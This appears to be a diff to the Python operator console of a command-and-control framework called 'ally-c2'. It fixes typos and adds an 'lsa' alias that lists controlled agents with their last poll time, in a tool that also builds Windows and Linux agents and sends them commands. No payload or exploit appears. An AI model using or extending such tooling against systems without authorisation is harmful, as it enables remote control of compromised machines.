@@ -1,5 +1,6 @@
 import readline #for semi shell interaction in input 
 from pathlib import Path
+from datetime import datetime, timezone
 import asyncio
 import json
 import websockets
@@ -80,7 +81,7 @@ def all_actions(actions):
     use: <windows|linux> <ip|domain> <port> <http|https>
     es. build linux 192.168.1.10 8080 https
 
-- list-agents 
+- list-agents, lsa 
 - use <agent id>
 
 
@@ -110,7 +111,7 @@ def all_actions(actions):
 def my_clear():
     clear()
 
-def command_not_fount():
+def command_not_found():
     print_formatted_text(ANSI(f"-- [{RED}-{RESET}] command not found"))
 
 async def operator_login(username, pass_hash, websocket):
@@ -129,7 +130,7 @@ async def operator_login(username, pass_hash, websocket):
         
     print_formatted_text(ANSI(f"\n{GREEN}[+] Login success{RESET}\n"))
 
-    print(f"\n\n{BOLD}welcome{RESET} to the ally-cII pannel use {BOLD}help{RESET} to view")
+    print(f"\n\n{BOLD}welcome{RESET} to the ally-cII panel use {BOLD}help{RESET} to view")
     print(f"all the possible actions\n")
     return True
 
@@ -142,7 +143,7 @@ def compile_agent(source_file, target_os, output_name, built_server_url):
         print_formatted_text(ANSI(f"[{RED}-{RESET}] src file {source_file} not found"))
         return
 
-    print_formatted_text(ANSI(f"\n{BLUE}[*] Comipiling  os: {target_os} -  srv: {built_server_url}...{RESET}"))
+    print_formatted_text(ANSI(f"\n{BLUE}[*] Compiling  os: {target_os} -  srv: {built_server_url}...{RESET}"))
 
     try:
         env = os.environ.copy()
@@ -197,7 +198,7 @@ def agent_name_gen(target_os):
 
 async def event_listener(event_url):
     try:
-        # print(f"\n[DEBUG] connect to channer events: {event_url}")
+        # print(f"\n[DEBUG] connect to channel events: {event_url}")
 
         # use websockets.connect(event_url,ssl=ssl_context)
         async with websockets.connect(event_url,ssl=ssl_context) as ws:
@@ -234,7 +235,7 @@ async def event_listener(event_url):
     except websockets.exceptions.ConnectionClosed as e:
         print(f"\n{RED}[-] WebSocket closed form server: {e}{RESET}")
     except Exception as e:
-        print(f"\n{RED}[-] ctical error in event_listener: {e}{RESET}")
+        print(f"\n{RED}[-] critical error in event_listener: {e}{RESET}")
 
 
 
@@ -360,7 +361,7 @@ async def use_agent(websocket, agent_id, session):
 
 
             else:
-                command_not_fount()
+                command_not_found()
 
 
 
@@ -416,11 +417,35 @@ async def main(server_url, event_url):
 
 
 
-                    elif action == "list-agents":
+                    elif action == "list-agents" or action == "lsa":
                         payload = {"action": "list_agents"}
                         await websocket.send(json.dumps(payload))
                         response = json.loads(await websocket.recv())
-                        print(f"\nActive Agents:\n\n{response.get('agents')}\n")
+                        
+                        agents = response.get('agents', [])
+                        
+                        print("\nActive Agents:")
+                        print("-" * 65)
+                        if not agents:
+                            print("  (no agent )")
+                        else:
+                            for agent in agents:
+                                agent_id = agent.get('id', 'N/A')
+                                diff = agent.get('seconds_ago', 0)
+                                
+                                if diff < 0:
+                                    diff = 0  
+                                    
+                                if diff < 60:
+                                    time_ago = f"{diff} sec ago"
+                                elif diff < 3600:
+                                    time_ago = f"{diff // 60} min ago"
+                                else:
+                                    time_ago = f"{diff // 3600} h ago"
+                                    
+                                print(f"ID:        {agent_id:<15}        | latest poll: {time_ago}")
+                                
+                        print("-" * 65 + "\n")
                         continue
 
 
@@ -472,7 +497,7 @@ async def main(server_url, event_url):
 
                     
                     else:
-                        command_not_fount()
+                        command_not_found()
 
 
 
@@ -505,7 +530,7 @@ if __name__ == "__main__":
     try:
         asyncio.run(main(server_url,events_url))
     except KeyboardInterrupt:
-        print(f"\n[{RED}*{RESET}] forced exit form ally-c2 CLI-CLIENT.")
+        print(f"\n[{RED}*{RESET}] forced exit from ally-c2 CLI-CLIENT.")
 
 
 
